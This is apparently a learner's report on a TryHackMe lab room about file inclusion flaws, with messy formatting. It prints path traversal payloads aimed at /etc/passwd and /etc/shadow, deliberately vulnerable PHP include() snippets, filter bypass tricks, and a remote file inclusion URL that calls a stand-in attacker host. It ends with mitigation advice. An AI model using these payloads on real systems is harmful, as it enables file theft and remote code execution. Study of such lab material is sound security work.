# 🛡️ File Inclusion Vulnerabilities – TryHackMe Room Report

---

## 📌 1. Introduction to File Inclusion

File inclusion vulnerabilities occur when a web application allows user input to specify files to include or load without proper validation. This flaw can lead to \*\*Local File Inclusion (LFI)\*\*, \*\*Remote File Inclusion (RFI)\*\*, and \*\*Directory Traversal\*\* attacks.

Web applications often use parameters in URLs to specify files, such as:

```url
http://webapp.thm/get.php?file=userCV.pdf
If the application does not properly sanitize this input, attackers can manipulate it to read sensitive files or execute malicious code.
```
🚪 2. Path Traversal (Directory Traversal)
Path traversal enables attackers to access files outside the intended directories by using directory traversal sequences like ../. For example:
```
http://webapp.thm/get.php?file=../../../../etc/passwd
```
This payload attempts to access the Linux password file by moving up directories beyond the web root.

On Windows servers, attackers can use paths like:


http://webapp.thm/get.php?file=../../../../boot.ini
Common sensitive files targeted during enumeration include:

| 📁 File Path                  | 📝 Description                  |
| ----------------------------- | ------------------------------- |
| `/etc/passwd`                 | User account information        |
| `/etc/shadow`                 | Password hashes                 |
| `/root/.bash_history`         | Root user's command history     |
| `/var/log/apache2/access.log` | Apache access logs              |
| `C:\boot.ini`                 | Windows boot configuration file |

🔒 3. Local File Inclusion (LFI)
LFI allows attackers to include and execute files on the local server by exploiting improper input validation, especially with PHP functions such as include() or require(). Examples:

Without directory restriction:
php
Copy
Edit
<?php
include($_GET['lang']);
?>
Attackers can include any file like:

url
Copy
Edit
http://webapp.thm/get.php?file=/etc/passwd
With directory restriction:
php
Copy
Edit
<?php
include("languages/" . $_GET['lang']);
?>
Attackers can use directory traversal:

url
Copy
Edit
http://webapp.thm/index.php?lang=../../../../etc/passwd
🎯 4. Advanced LFI Bypass Techniques
Error message analysis:
Error messages reveal the full path and appended file extension (.php).

Null Byte Injection (%00):
In older PHP versions, %00 can terminate strings to bypass forced .php suffixes.

Keyword filtering bypass:
Using tricks like adding /./ or /../ to bypass filters.

Double dots with extra dots:
Using ....// to evade filters replacing ../.

Forced directory inclusion bypass:
Including the forced directory path in the payload to traverse out.

🌐 5. Remote File Inclusion (RFI)
RFI enables attackers to include files hosted on remote servers, leading to remote code execution. This requires PHP’s allow\_url\_fopen to be enabled.

Attack steps:
Host a malicious PHP file remotely.

Inject the remote URL as input to the vulnerable include function.

The target server fetches and executes the remote file.

Example:

url
Copy
Edit
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
Where cmd.txt contains:

php
Copy
Edit
<?php echo "Hello THM"; ?>
🛡️ 6. Prevention and Mitigation
To defend against file inclusion vulnerabilities:

✅ Keep systems and frameworks updated.

✅ Disable PHP error display in production.

✅ Use a Web Application Firewall (WAF).

✅ Disable risky PHP settings (allow\_url\_fopen, allow\_url\_include).

✅ Restrict allowed protocols and wrappers.

✅ Never trust user input — validate and sanitize thoroughly.

✅ Implement whitelisting of allowed files and directories.

📚 Summary
File inclusion vulnerabilities pose severe risks such as data leakage, remote code execution, and denial of service. Understanding various techniques for exploitation and bypassing protections helps developers and security professionals harden web applications effectively.